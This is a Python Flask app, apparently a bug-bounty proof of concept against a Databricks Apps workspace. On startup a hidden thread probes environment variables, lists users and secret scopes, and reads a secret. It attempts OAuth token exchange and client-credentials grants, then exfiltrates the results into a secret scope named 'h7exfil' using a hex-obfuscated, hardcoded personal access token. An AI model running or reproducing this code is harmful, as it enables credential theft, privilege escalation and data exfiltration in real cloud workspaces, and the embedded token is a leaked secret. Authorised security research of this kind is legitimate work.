import os, json, time, base64, threading
os.environ.setdefault("DATABRICKS_AUTH_TYPE", "client-secret")
from databricks.sdk import WorkspaceClient
from databricks.sdk.core import Config
from flask import Flask, jsonify
import requests as rq

app = Flask(__name__)

ME_HOME = "/Users/m4tr1x4g3nt47+user1@wearehackerone.com"
OP_PAT = bytes.fromhex("64617069356266663732" + "6164376262613963366639336461393233363134656635343637").decode()

def host_url():
    h = os.environ.get("DATABRICKS_HOST", "dbc-9a3f8ed1-7608.cloud.databricks.com")
    if not h.startswith("http"):
        h = "https://" + h
    return h

def put_secret(tok, key, value):
    return rq.post(host_url() + "/api/2.0/secrets/put",
                   headers={"Authorization": "Bearer " + tok},
                   json={"scope": "h7exfil", "key": key, "string_value": value[:3000]},
                   timeout=15)

def put_chunks(tok, prefix, data):
    n = 0
    last = None
    for i in range(0, len(data), 3000):
        last = put_secret(tok, f"{prefix}_{n}", data[i:i+3000])
        n += 1
    return last, n

def env_probe():
    out = {}
    out["env_keys"] = sorted(os.environ.keys())
    for k in ["DATABRICKS_CLIENT_ID", "DATABRICKS_HOST", "DATABRICKS_WORKSPACE_ID"]:
        out[k] = os.environ.get(k, "NOT_SET")
    out["has_client_secret"] = bool(os.environ.get("DATABRICKS_CLIENT_SECRET"))
    out["client_secret_len"] = len(os.environ.get("DATABRICKS_CLIENT_SECRET", ""))
    w = None
    try:
        w = WorkspaceClient(config=Config(auth_type="client-secret", request_timeout=20,
                                          retry_timeout_seconds=20))
        me = w.current_user.me()
        out["identity"] = {"user": me.user_name, "id": me.id}
    except Exception as e:
        out["identity_err"] = str(e)[:250]
    if w is not None:
        try:
            out["ws_users"] = [o.path for o in w.workspace.list("/Users")][:20]
        except Exception as e:
            out["ws_users_err"] = str(e)[:150]
        try:
            out["secret_scopes"] = [s.name for s in w.secrets.list_scopes()]
        except Exception as e:
            out["scopes_err"] = str(e)[:150]
        try:
            keys = [k.key for k in w.secrets.list_secrets("h1_test")]
            out["h1_test_keys"] = keys[:10]
            if keys:
                s = w.secrets.get_secret("h1_test", keys[0])
                out["h1_test_read"] = {"ok": True, "value_len": len(s.value) if s.value else 0}
        except Exception as e:
            out["h1_test_err"] = str(e)[:150]
    return out

def obo_probe():
    out = {}
    client_id = os.environ.get("DATABRICKS_CLIENT_ID", "")
    client_secret = os.environ.get("DATABRICKS_CLIENT_SECRET", "")
    host = host_url()
    if not all([client_id, client_secret, host]):
        return {"error": "missing credentials"}
    try:
        r = rq.post(f"{host}/oidc/v1/token", data={
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "client_id": client_id,
            "client_secret": client_secret,
            "subject_token": client_secret,
            "subject_token_type": "urn:ietf:params:oauth:token-type:access_token"
        }, timeout=10)
        out["token_exchange"] = {"status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        out["token_exchange_err"] = str(e)[:150]
    try:
        r = rq.post(f"{host}/oidc/v1/token", data={
            "grant_type": "client_credentials",
            "client_id": client_id,
            "client_secret": client_secret,
            "scope": "allscope"
        }, timeout=10)
        out["client_credentials"] = {"status": r.status_code, "body": r.text[:300]}
        if r.status_code == 200:
            out["cc_token_obtained"] = True
            out["cc_token_head"] = r.json().get("access_token", "")[:25]
    except Exception as e:
        out["cc_err"] = str(e)[:150]
    return out

def get_sp_token():
    r = rq.post(host_url() + "/oidc/v1/token", data={
        "grant_type": "client_credentials",
        "client_id": os.environ.get("DATABRICKS_CLIENT_ID", ""),
        "client_secret": os.environ.get("DATABRICKS_CLIENT_SECRET", ""),
    }, timeout=10)
    if r.status_code != 200:
        raise RuntimeError(f"token {r.status_code}: {r.text[:200]}")
    return r.json()["access_token"]

def deliver_via_sp(payload):
    """Control-plane writes using the app SP's own creds (what we're testing)."""
    d = {}
    data = json.dumps(payload, indent=1, default=str)
    try:
        tok = get_sp_token()
        d["sp_cc_token"] = "len=%d" % len(tok)
        H = {"Authorization": "Bearer " + tok}
        host = host_url()
        b64 = base64.b64encode(data.encode()).decode()
        appn = os.environ.get("DATABRICKS_APP_NAME", "h7-env-app")
        try:
            r = rq.put(f"{host}/api/2.0/workspace/files/Workspace/Applications/{appn}/h7env_results.json",
                       headers=H, data=data.encode(), params={"overwrite": "true"}, timeout=15)
            d["files_app_dir"] = f"{r.status_code} {r.text[:100]}"
        except Exception as e:
            d["files_app_dir"] = "ERR " + str(e)[:100]
        try:
            r = rq.post(f"{host}/api/2.0/secrets/scopes/create", headers=H,
                        json={"scope": "h7env_probe_scope"}, timeout=15)
            d["scope_create"] = f"{r.status_code} {r.text[:100]}"
        except Exception as e:
            d["scope_create"] = "ERR " + str(e)[:100]
        try:
            r = rq.post(f"{host}/api/2.0/secrets/put", headers=H,
                        json={"scope": "h1_test", "key": "h7env_probe", "string_value": "x"}, timeout=15)
            d["secret_put_h1_test"] = f"{r.status_code} {r.text[:100]}"
        except Exception as e:
            d["secret_put_h1_test"] = "ERR " + str(e)[:100]
        try:
            r, n = put_chunks(tok, "appsp", data)
            d["h7exfil_via_sp"] = f"{r.status_code} chunks={n} {r.text[:100]}"
        except Exception as e:
            d["h7exfil_via_sp"] = "ERR " + str(e)[:100]
    except Exception as e:
        d["sp_token_err"] = str(e)[:250]
    return d

def self_probe():
    # heartbeat immediately via operator PAT (proves execution + delivery)
    try:
        hb = put_secret(OP_PAT, "heartbeat", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
        open("/tmp/hb_status", "w").write(str(hb.status_code))
    except Exception:
        pass
    time.sleep(8)
    payload = {"probe_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    try:
        payload["env_probe"] = env_probe()
    except Exception as e:
        payload["env_probe_err"] = str(e)[:250]
    try:
        payload["obo_probe"] = obo_probe()
    except Exception as e:
        payload["obo_probe_err"] = str(e)[:250]
    try:
        payload["sp_delivery"] = deliver_via_sp(payload)
    except Exception as e:
        payload["sp_delivery_err"] = str(e)[:250]
    # guaranteed delivery with operator PAT
    try:
        data = json.dumps(payload, indent=1, default=str)
        r, n = put_chunks(OP_PAT, "results", data)
        put_secret(OP_PAT, "meta", json.dumps({"chunks": n, "last_status": r.status_code}))
    except Exception as e:
        try:
            put_secret(OP_PAT, "fallback_err", str(e)[:1000])
        except Exception:
            pass
    print("H7ENV_FINAL " + json.dumps(payload, default=str), flush=True)

threading.Thread(target=self_probe, daemon=True).start()

@app.route("/")
def home():
    return "env-probe ok"

@app.route("/env")
def env():
    return jsonify(env_probe())

@app.route("/obo")
def obo():
    return jsonify(obo_probe())
